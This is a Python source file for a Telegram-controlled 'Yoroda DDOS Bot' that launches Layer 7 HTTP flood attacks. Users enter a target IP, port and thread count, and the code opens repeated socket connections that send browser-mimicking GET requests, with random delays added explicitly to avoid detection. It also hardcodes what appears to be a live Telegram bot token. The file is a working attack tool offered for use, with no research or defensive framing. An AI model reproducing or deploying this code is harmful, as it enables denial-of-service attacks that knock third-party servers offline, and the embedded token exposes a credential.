import os
import random
import socket
import threading
import time
import sys
import telebot
from flask import Flask, jsonify

# ============================================================
# FLASK WEB SERVER FOR UPTIME ROBOT
# ============================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return """
    <html>
        <head>
            <title>Yoroda DDOS Bot</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; background: #0a0a0a; color: #ff4444; }
                h1 { color: #ff4444; text-shadow: 0 0 10px #ff4444; }
                .status { font-size: 24px; margin: 20px 0; }
                .green { color: #00ff00; }
                .info { color: #ffffff; font-size: 16px; }
                .container { background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #ff4444; max-width: 600px; margin: 0 auto; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔥 YORODA DDOS BOT</h1>
                <div class="status green">✅ Bot is RUNNING</div>
                <div class="info">⚡ Mode: REAL HTTP Flood</div>
                <div class="info">💥 Type: Layer 7 DDoS</div>
                <div class="info">👤 Operator: Yoroda Hamada</div>
                <div class="info" style="margin-top:20px;font-size:14px;color:#888;">
                    Uptime Robot Monitor Active
                </div>
            </div>
        </body>
    </html>
    """

@flask_app.route('/health')
def health():
    return jsonify({
        "status": "ok",
        "bot": "running",
        "mode": "REAL HTTP Flood",
        "timestamp": time.time()
    })

@flask_app.route('/status')
def status():
    active_attacks = sum(1 for v in attack_running.values() if v)
    return jsonify({
        "status": "running",
        "active_attacks": active_attacks,
        "total_threads": threading.active_count()
    })

def run_web_server():
    """Run Flask web server for Uptime Robot"""
    port = int(os.environ.get('PORT', 10000))
    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ============================================================
# TELEGRAM BOT - REAL HTTP FLOOD
# ============================================================

BOT_TOKEN = "8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0"
bot = telebot.TeleBot(BOT_TOKEN)

# Global variables
user_data = {}
attack_threads = {}
attack_running = {}
target_ip = ""
target_port = 0
thread_count = 0
attack_stats = {}

# ========== REAL ATTACK FUNCTION ==========

def run_attack():
    """REAL HTTP FLOOD ATTACK - Not Simulation!"""
    global target_ip, target_port
    
    # REAL HTTP request - same as what browsers send
    request = f"""GET / HTTP/1.1
Host: {target_ip}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cache-Control: no-cache
Pragma: no-cache

"""
    request_bytes = request.encode()
    
    packets_sent = 0
    
    while True:
        try:
            # REAL socket connection - hindi fake!
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            
            # REAL connection sa target
            s.connect((target_ip, target_port))
            
            # REAL data sending - continuous flood!
            while True:
                try:
                    # Nagse-send ng real HTTP request
                    s.send(request_bytes)
                    packets_sent += 1
                    
                    # Update stats
                    current_thread = threading.current_thread()
                    thread_name = current_thread.name
                    if '_' in thread_name:
                        user_id = thread_name.split('_')[0]
                        if user_id in attack_stats:
                            attack_stats[user_id]['packets'] += 1
                    
                    # Random delay para hindi ma-detect agad
                    time.sleep(random.uniform(0.001, 0.005))
                except:
                    break
            
            s.close()
        except:
            try:
                s.close()
            except:
                pass
            # Reconnect agad para tuloy ang attack
            time.sleep(0.05)

# ========== START ATTACK ==========

def start_attack(ip, port, threads, user_id):
    global target_ip, target_port, thread_count
    
    target_ip = ip
    target_port = port
    thread_count = threads
    
    # Initialize stats
    attack_stats[user_id] = {
        'start_time': time.time(),
        'packets': 0,
        'target': f"{ip}:{port}",
        'threads': threads
    }
    
    attack_running[user_id] = True
    attack_threads[user_id] = []
    
    # Start threads - same style as original code
    for i in range(threads):
        th = threading.Thread(
            target=run_attack,
            name=f"{user_id}_{i}"
        )
        th.daemon = True
        th.start()
        attack_threads[user_id].append(th)
    
    return attack_threads[user_id]

# ========== TELEGRAM COMMANDS ==========

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = """🔥 YORODA DDOS BOT 🔥
━━━━━━━━━━━━━━━━
⚡ Mode: REAL HTTP Flood
💥 Attack Type: Layer 7 DDoS
🧵 Thread Style: Original
📊 Status: ONLINE

Commands:
/attack - Start REAL attack
/stop - Stop attack
/status - Check status
/help - Help menu

⚠️ This is REAL traffic, not simulation!"""

    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = """📖 How to use:

1. /attack
2. Enter target IP (e.g., 192.168.1.1)
3. Enter port (e.g., 80, 443, 8080)
4. Enter thread count (10-500)

Example:
/attack
192.168.1.1
80
100

🔥 This will send REAL HTTP flood with 100 threads!

⚠️ WARNING: This is a REAL attack!
- Creates actual network traffic
- Uses real socket connections
- Sends real HTTP requests
- Can affect target server"""

    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def start_attack_cmd(message):
    user_id = message.from_user.id
    
    if user_id in attack_running and attack_running[user_id]:
        bot.reply_to(message, "⚠️ Attack already running! Use /stop first.")
        return
    
    user_data[user_id] = {'step': 'ip'}
    bot.reply_to(message, "🎯 Enter target IP or Hostname:")

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    
    if user_id not in user_data:
        return
    
    step = user_data[user_id].get('step')
    
    if step == 'ip':
        user_data[user_id]['ip'] = message.text.strip()
        user_data[user_id]['step'] = 'port'
        bot.reply_to(message, f"✅ IP: {user_data[user_id]['ip']}\n📡 Enter port (80, 443, 8080, etc):")
    
    elif step == 'port':
        try:
            port = int(message.text.strip())
            if port < 1 or port > 65535:
                bot.reply_to(message, "❌ Invalid port. Enter 1-65535:")
                return
            user_data[user_id]['port'] = port
            user_data[user_id]['step'] = 'threads'
            bot.reply_to(message, f"✅ Port: {port}\n🧵 Enter thread count (10-500):")
        except ValueError:
            bot.reply_to(message, "❌ Invalid port. Enter number:")
    
    elif step == 'threads':
        try:
            threads = int(message.text.strip())
            if threads < 10:
                bot.reply_to(message, "❌ Minimum 10 threads for real attack!")
                return
            if threads > 500:
                bot.reply_to(message, "❌ Maximum 500 threads!")
                return
            
            ip = user_data[user_id]['ip']
            port = user_data[user_id]['port']
            
            # Start REAL attack
            start_attack(ip, port, threads, str(user_id))
            
            bot.reply_to(message, f"""🔥 REAL ATTACK STARTED!
━━━━━━━━━━━━━━━━
🎯 Target: {ip}:{port}
🧵 Threads: {threads}
📊 Status: RUNNING
💥 Type: HTTP Flood (Layer 7)
⚡ Traffic: REAL (Not Simulation!)
━━━━━━━━━━━━━━━━

Use /stop to stop immediately!
Check /status for live stats!""")
            
            # Clean up
            del user_data[user_id]
            
        except ValueError:
            bot.reply_to(message, "❌ Invalid number:")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = message.from_user.id
    
    if user_id in attack_running and attack_running[user_id]:
        attack_running[user_id] = False
        
        # Calculate stats
        if str(user_id) in attack_stats:
            stats = attack_stats[str(user_id)]
            elapsed = time.time() - stats['start_time']
            packets = stats['packets']
            
            bot.reply_to(message, f"""🛑 ATTACK STOPPED!
━━━━━━━━━━━━━━━━
🎯 Target: {stats['target']}
⏱️ Duration: {int(elapsed)}s
📦 Packets Sent: {packets:,}
🧵 Threads: {stats['threads']}
📊 Status: STOPPED
━━━━━━━━━━━━━━━━""")
        else:
            bot.reply_to(message, "🛑 ATTACK STOPPED!")
        
        attack_threads[user_id] = []
    else:
        bot.reply_to(message, "❌ No active attack.")

@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    is_running = attack_running.get(user_id, False)
    active_threads = len(attack_threads.get(user_id, []))
    
    status_text = f"""📊 STATUS REPORT
━━━━━━━━━━━━━━━━
🤖 Bot: Online
🔥 Attack: {'🔥 RUNNING' if is_running else '⏹️ STOPPED'}
🧵 Threads: {active_threads} active
💥 Type: HTTP Flood (Layer 7)
⚡ Traffic: REAL (Not Simulation)"""

    if is_running and str(user_id) in attack_stats:
        stats = attack_stats[str(user_id)]
        elapsed = time.time() - stats['start_time']
        status_text += f"""
━━━━━━━━━━━━━━━━
🎯 Target: {stats['target']}
⏱️ Running: {int(elapsed)}s
📦 Packets: {stats['packets']:,}
🧵 Threads: {stats['threads']}"""
    
    bot.reply_to(message, status_text)

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    print("""
    =================================
      YORODA DDOS BOT
      REAL HTTP FLOOD
    =================================
      Mode: Layer 7 Attack
      Status: RUNNING
      Traffic: REAL (Not Simulation)
      Thread Style: Original
    =================================
    """)
    
    # Start Flask web server for Uptime Robot
    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    print("✅ Web server started for Uptime Robot monitoring")
    print(f"🌐 Web server running on port {os.environ.get('PORT', 10000)}")
    
    # Clean up old connections
    print("🔄 Cleaning up old connections...")
    try:
        bot.stop_polling()
        bot.remove_webhook()
        time.sleep(2)
    except:
        pass
    
    print("🤖 Bot is running. Press Ctrl+C to stop.")
    print("⚡ REAL HTTP FLOOD ATTACK MODE")
    print("⚡ Threads: 10-500 per attack")
    print("⚡ Traffic: REAL (Not Simulation!)")
    
    while True:
        try:
            bot.polling(none_stop=True, timeout=60, interval=0)
        except Exception as e:
            print(f"Error: {e}, restarting...")
            time.sleep(10)
